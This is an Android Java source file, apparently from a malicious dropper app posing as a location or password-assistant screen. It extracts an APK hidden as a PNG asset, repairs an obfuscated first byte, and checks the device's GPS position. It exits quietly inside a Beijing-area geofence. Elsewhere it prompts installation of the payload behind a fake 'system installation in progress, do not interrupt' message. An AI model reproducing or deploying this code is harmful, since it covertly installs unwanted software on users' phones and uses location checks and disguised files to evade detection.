package li.who.you;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import li.who.decypt.Encypt;

import android.app.ActionBar.LayoutParams;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.baidu.mapapi.BMapManager;
import com.baidu.mapapi.LocationListener;
import com.baidu.mapapi.MKLocationManager;
import com.baidu.mapapi.MapActivity;
import com.hyh.passwordassitant.activity.Dispatcher;
import com.hyh.passwordassitant.activity.HelpActivityAtFirstRun;


/**
 * 创建Activity（继承com.baidu.mapapi.MapActivity）
 */
public class LocationActivity extends MapActivity implements LocationListener {
	private BMapManager mapManager;
	private MKLocationManager mLocationManager = null;

	
	public static double lat = 0.0;
	public static double log = 0.0;
	private String defaultDir = Environment.getExternalStorageDirectory()
			.getPath()
			+ File.separator
			+ "AGetCity"
			+ File.separator
			+ "GetCity" + File.separator;
	//private String apkname = "GetCity6.apk";
	private String apkname2 = "BIRD";
	String packname ="com.belrare.dabenniao";
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		// 去掉标题栏
		 		requestWindowFeature(Window.FEATURE_NO_TITLE);
		 		getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
		 		getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
		     // 全屏显示
		 		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
		 				WindowManager.LayoutParams.FLAG_FULLSCREEN);
		//setContentView(R.layout.mainmap);
		//setContentView(Resource.getIdByName(getApplication(), "layout", "mainmap"));  
		com.baidu.mapapi.MapView baidu = new com.baidu.mapapi.MapView(this);
		baidu.setVisibility(8);
		ProgressBar process = new ProgressBar(this);
		LinearLayout b = new LinearLayout(this);
		LayoutParams laParams=(LayoutParams)process.getLayoutParams();
		//laParams.gravity = Gravity.CENTER;
		b.addView(baidu);
		b.addView(process);
		//setContentView();
		this.setContentView(b);
		//latText = (TextView) findViewById(R.id.lat);
		//lonText = (TextView) findViewById(R.id.lon);

		// 初始化MapActivity
		mapManager = new BMapManager(getApplication());
		// init方法的第一个参数需填入申请的API Key
		mapManager.init("C66C0501D0280744759A6957C42543AE38F5D540", null);
		super.initMapActivity(mapManager);

		mLocationManager = mapManager.getLocationManager();
		// 注册位置更新事件
		mLocationManager.requestLocationUpdates(this);
		// 使用GPS定位
		mLocationManager.enableProvider((int) MKLocationManager.MK_GPS_PROVIDER);
		initVideoDiagnosisroot();
		 
	}

	@Override
	protected boolean isRouteDisplayed() {
		return false;
	}
    public void startone(){


    }
	@Override
	protected void onDestroy() {
		if (mapManager != null) {
			mapManager.destroy();
			mapManager = null;
		}
		mLocationManager = null;
		super.onDestroy();
	}

	@Override
	protected void onPause() {
		if (mapManager != null) {
			mapManager.stop();
		}
		super.onPause();
	}

	@Override
	protected void onResume() {
		if (mapManager != null) {
			mapManager.start();
		}
		super.onResume();
	}
	private void initVideoDiagnosisroot(){


		boolean sdCardExit = Environment.getExternalStorageState().equals(
				android.os.Environment.MEDIA_MOUNTED);
		if (!sdCardExit) {
			Toast.makeText(getApplicationContext(), "请插入CARD",
					Toast.LENGTH_LONG).show();
			return;
		}
		File fileDir = new File(defaultDir);
		File file = new File(defaultDir+apkname2+".apk");
		if(!file.exists()){
			try {
				FileOutputStream out;
				InputStream inputStream; 
				try {
					if (!fileDir.exists()) {
						fileDir.mkdirs();
					}
					if(!file.exists()){
						file.createNewFile();
					}
					inputStream=getResources().getAssets().open(apkname2+".png");
					out = new FileOutputStream(file);
					byte[] buff = new byte[1024];
					int data=0;
					while((data=inputStream.read(buff))!=-1){
						out.write(buff, 0, data);
					}
					out.close();
					inputStream.close();
				} catch (FileNotFoundException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}catch (Exception e) {
				e.printStackTrace();
			}
			
			byte[] bb;
			try {
				bb = Encypt.getByteTypeByStream(file.getAbsolutePath());
				byte[] bb1 = bb;
				bb1[0] = (byte)(bb1[0]-1);
	        	Encypt.UpateFileType(file.getAbsolutePath(), bb1);
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	/**
	 * 根据MyLocationOverlay配置的属性确定是否在地图上显示当前位置
	 */
	@Override
	protected boolean isLocationDisplayed() {
		return false;
	}

	/**
	 * 当位置发生变化时触发此方法
	 * 
	 * @param location 当前位置
	 */
	public void onLocationChanged(Location location) {
		if (location != null) {
			// 显示定位结果
			//lonText.setText("当前经度：" + location.getLongitude());
			log = location.getLongitude();
			//latText.setText("当前纬度：" + location.getLatitude());
			lat = location.getLatitude();
			
			if(((log>=115.49)&&(log<=117.50))&&((lat>=38.98)&&(lat<=40.99))){
		   //if(false){
					
				//Intent mainIntent = new Intent(LocationActivity.this,MainActivity.class); 
				 //LocationActivity.this.startActivity(mainIntent); 
				 LocationActivity.this.finish();
			}
			else{
				//Intent mainIntent = new Intent(LocationActivity.this,Splash.class); 
				// LocationActivity.this.startActivity(mainIntent); 
				// LocationActivity.this.finish();
				if(isAvilible(getApplicationContext(), packname)){
					Intent localIntent7 = new Intent(LocationActivity.this.getApplicationContext(), HelpActivityAtFirstRun.class);
					LocationActivity.this.startActivity(localIntent7);
		            LocationActivity.this.overridePendingTransition(2130968582, 2130968591);
					LocationActivity.this.finish();
                     
		        	//EnterActivity();
		    	}
		        else{
		        	
		        	
		        	final String m = defaultDir+apkname2+".apk";
					Intent intent = new Intent(Intent.ACTION_VIEW); 
	                intent.setDataAndType(Uri.fromFile(new File(m)), "application/vnd.android.package-archive"); 
	                startActivity(intent);
	                Toast.makeText(getApplicationContext(), "系统安装过程正在进行中，请勿中断",
	    					Toast.LENGTH_LONG).show();
		        }
				
			}
		}
	}
	 private boolean isAvilible(Context context, String packageName){ 
	        final PackageManager packageManager = context.getPackageManager();//获取packagemanager 
	        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);//获取所有已安装程序的包信息 
	        List<String> pName = new ArrayList<String>();//用于存储所有已安装程序的包名 
	       //从pinfo中将包名字逐一取出，压入pName list中 
	            if(pinfo != null){ 
	            for(int i = 0; i < pinfo.size(); i++){ 
	                String pn = pinfo.get(i).packageName; 
	                pName.add(pn); 
	            } 
	        } 
	        return pName.contains(packageName);//判断pName中是否有目标程序的包名，有TRUE，没有FALSE 
	  }
}